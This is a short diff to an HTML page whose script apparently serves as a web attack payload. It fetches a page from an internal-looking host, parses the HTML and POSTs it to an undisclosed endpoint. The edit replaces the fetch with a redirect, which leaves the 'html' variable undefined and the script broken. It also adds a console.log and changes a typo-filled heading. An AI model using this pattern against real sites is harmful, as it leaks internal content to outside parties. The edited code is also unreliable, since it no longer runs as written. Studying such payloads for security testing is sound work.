@@ -5,7 +5,7 @@
 
 
 
-  const html = await (await fetch('https://internal.sketchycompany.upd-dcs.work')).text();
+  document.location.href = 'https://internal.sketchycompany.upd-dcs.work';
  
   const doc = new DOMParser().parseFromString(
     html, 'text/html'
@@ -16,6 +16,8 @@
     method: "POST",
     body: doc
   })
+
+  console.log(doc);
 </script>
 
-<h2>Hello owrld</h2>
+<h2>Hello owrld new</h2>
